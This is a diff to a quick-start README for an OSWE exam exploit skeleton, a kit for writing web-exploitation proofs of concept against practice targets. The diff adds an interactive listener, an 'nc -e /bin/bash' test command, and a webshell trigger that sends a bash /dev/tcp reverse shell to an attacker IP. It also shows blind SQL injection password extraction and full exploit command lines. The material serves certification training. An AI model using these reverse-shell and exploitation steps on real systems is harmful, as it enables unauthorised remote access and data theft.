@@ -2,6 +2,16 @@
 
 **Get up and running in 5 minutes**
 
+## Skeleton Selection
+
+Choose the right skeleton for your exploit:
+
+| Skeleton | Use Case | Features |
+|----------|----------|----------|
+| `poc_advanced.py` | Complex exploits | Full modules, stages, dependencies |
+| `poc_simple.py` | Quick/simple exploits | Single file, no dependencies |
+| `examples/step_based_example.py` | Linear exploits | Sequential steps using modules |
+
 ## Installation
 
 ```bash
@@ -12,7 +22,7 @@ cd /home/simon/code/OSWE-Prep/poc-examples/advanced-skeleton
 pip3 install aiohttp
 ```
 
-## Test the Skeleton
+## Quick Test
 
 ### 1. Test Individual Modules
 
@@ -23,6 +33,10 @@ python3 modules/logger.py
 # Test payload server
 python3 modules/payload_server.py
 # In another terminal: curl http://localhost:8000/shell.php
+
+# Test listener (will wait for connection)
+python3 modules/listener.py
+# In another terminal: nc -e /bin/bash 127.0.0.1 4444
 
 # Test stage management
 python3 modules/stages.py
@@ -38,18 +52,30 @@ python3 modules/stages.py
 python3 examples/example_full_exploitation.py --target-ip 192.168.1.100
 ```
 
-### 3. Customize for Your Vulnerability
+### 3. Choose Your Skeleton
 
+**Option A: Full-Featured (poc_advanced.py)**
 ```bash
-# Copy the skeleton
+# Copy and customize
 cp poc_advanced.py my_exploit.py
-
-# Edit stage functions
 vim my_exploit.py
+# Modify stage functions
+```
 
-# Find and modify:
-# - def stage_exploit(ctx, manager)
-# - def stage_verify(ctx, manager)
+**Option B: Lightweight (poc_simple.py)**
+```bash
+# Single-file, no dependencies
+cp poc_simple.py my_exploit.py
+vim my_exploit.py
+# Modify step1(), step2(), etc.
+```
+
+**Option C: Step-Based Pattern**
+```bash
+# Reference implementation
+cp examples/step_based_example.py my_exploit.py
+vim my_exploit.py
+# See step-by-step example
 ```
 
 ## Module Usage Examples
@@ -93,6 +119,29 @@ print(f"Shell: {server.get_url('/shell.php')}")
 server.stop()
 ```
 
+### Interactive Listener
+
+```python
+from modules import InteractiveListener
+
+# Create listener
+listener = InteractiveListener(port=4444)
+
+# Start in background
+listener.start(blocking=False)
+print(f"Listener on port 4444")
+
+# Trigger reverse shell on target...
+
+# Wait for connection
+if listener.wait_for_connection(timeout=60):
+    print("Got shell!")
+    listener.interactive_shell()  # Interactive mode
+
+# Cleanup
+listener.stop()
+```
+
 ### Stage Manager
 
 ```python
@@ -127,6 +176,25 @@ sqli = BlindSQLi(
 # Extract with binary search (fast!)
 password = sqli.extract("SELECT password FROM users LIMIT 1")
 print(f"Password: {password}")
+```
+
+### Liveness Check
+
+```python
+# In your exploit, add at the beginning:
+from poc_advanced import liveness_check
+
+if not liveness_check(ctx):
+    ctx.logger.error("Target unreachable")
+    sys.exit(1)
+
+# Or in poc_simple.py:
+def liveness_check():
+    try:
+        response = session.get(target_url, timeout=10)
+        return response.status_code == 200
+    except:
+        return False
 ```
 
 ## Common Customizations
@@ -206,23 +274,95 @@ def stage_payload_server(ctx: ExploitContext, manager: StageManager) -> bool:
     return True
 ```
 
+### 4. Capture Reverse Shell
+
+```python
+def stage_reverse_shell(ctx: ExploitContext, manager: StageManager) -> bool:
+    """Capture and interact with reverse shell."""
+
+    # Start listener
+    ctx.listener = InteractiveListener(port=ctx.attacker_port)
+    ctx.listener.start(blocking=False)
+
+    ctx.logger.info("Triggering reverse shell on target...")
+
+    # Trigger shell via exploit
+    trigger_url = f"{ctx.shell_url}?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{ctx.attacker_ip}/{ctx.attacker_port}+0>%261'"
+    ctx.session.get(trigger_url, timeout=2)
+
+    # Wait and capture
+    if ctx.listener.wait_for_connection(timeout=60):
+        ctx.logger.success("Shell connected!")
+        ctx.listener.interactive_shell()
+        return True
+    else:
+        ctx.logger.error("No connection")
+        return False
+```
+
+## Skeleton Selection Guide
+
+### When to Use Each Skeleton
+
+**`poc_advanced.py`** - Use for:
+- Multi-stage exploits with dependencies
+- Complex vulnerability chains
+- When you need retry logic
+- Blind SQLi extraction
+- Multiple verification methods
+- Professional audit trail required
+
+**`poc_simple.py`** - Use for:
+- Single vulnerability exploits
+- Quick proof-of-concepts
+- When portability is important
+- Standalone scripts (no module dependencies)
+- Learning/experimenting
+
+**`examples/step_based_example.py`** - Use for:
+- Linear exploit flows
+- When stages feel like overkill
+- Educational examples
+- Reference for using modules with step pattern
+
 ## Directory Layout for OSWE Exam
 
 For each exam machine, create:
 
 ```
 target1/
-├── poc.py              # Main exploit (copy from poc_advanced.py)
+├── poc.py              # Main exploit (choose your skeleton)
+├── poc_simple.py       # Optional: backup quick exploit
 ├── modules/            # Copy entire modules/ directory
 │   ├── __init__.py
 │   ├── logger.py
 │   ├── payload_server.py
+│   ├── listener.py
 │   ├── stages.py
 │   └── sqli.py
 ├── Notes.md            # Manual notes
 ├── Archives/           # Saved responses, tokens
 ├── Logs/               # Auto-generated logs
 └── Screenshots/        # Exam evidence
+```
+
+### Skeleton Decision Flow
+
+```
+Starting a new target?
+│
+├─ Complex multi-step exploit?
+│  ├─ Need dependencies/stages?
+│  │  └─► Use poc_advanced.py
+│  │
+│  └─ Linear sequential flow?
+│     └─► Use examples/step_based_example.py
+│
+├─ Simple single vulnerability?
+│  └─► Use poc_simple.py
+│
+└─ Need maximum portability?
+   └─► Use poc_simple.py (single file)
 ```
 
 ## Testing Workflow
@@ -312,13 +452,78 @@ manager.add_stage("Optional Step", func, optional=True)
 4. ✅ Customize `poc_advanced.py` for your target
 5. ✅ Practice with vulnerable VMs
 
+## Complete Examples
+
+### Example 1: Full Exploitation Chain (poc_advanced.py)
+
+```bash
+# Stage-based exploitation with all features
+python3 poc_advanced.py \
+  --target-ip 192.168.1.10 \
+  --target-port 80 \
+  --listening-ip 10.10.14.5 \
+  --listening-port 4444 \
+  --username admin \
+  --password secret \
+  --proxy http://127.0.0.1:8080 \
+  --verbose
+```
+
+### Example 2: Quick Exploit (poc_simple.py)
+
+```bash
+# Single-file, no dependencies
+python3 poc_simple.py \
+  --target-ip 192.168.1.10 \
+  --lhost 10.10.14.5 \
+  --lport 4444 \
+  --proxy http://127.0.0.1:8080
+```
+
+### Example 3: Step-Based Pattern
+
+```bash
+# Sequential step execution
+python3 examples/step_based_example.py \
+  --target-ip 192.168.1.10 \
+  --listening-ip 10.10.14.5 \
+  --username admin \
+  --password secret
+```
+
+### Example 4: Listener Only Test
+
+```bash
+# Test listener functionality
+python3 -c "
+from modules import InteractiveListener
+import time
+
+listener = InteractiveListener(port=4444)
+listener.start(blocking=False)
+print('Listener started on 4444')
+print('Run: nc -e /bin/bash 127.0.0.1 4444')
+
+if listener.wait_for_connection(timeout=30):
+    print('Got connection!')
+    listener.interactive_shell()
+
+listener.stop()
+"
+```
+
 ## Resources
 
 - **Full README**: `README.md`
 - **Module Docs**: `modules/*.py` (well-commented)
 - **Examples**: `examples/`
 - **Main Guide**: `../OSWE-PoC-Skeleton-Guide.md`
+- **Reference Repo**: https://github.com/dark-warlord14/oswe-exploit-kit (core logic integrated)
 
 ---
 
-**Ready to exploit? Start customizing `poc_advanced.py`! 🎯**
+**Ready to exploit? Choose your skeleton and start hacking! 🎯**
+
+- Complex exploit? → `poc_advanced.py`
+- Quick & simple? → `poc_simple.py`  
+- Learning steps? → `examples/step_based_example.py`
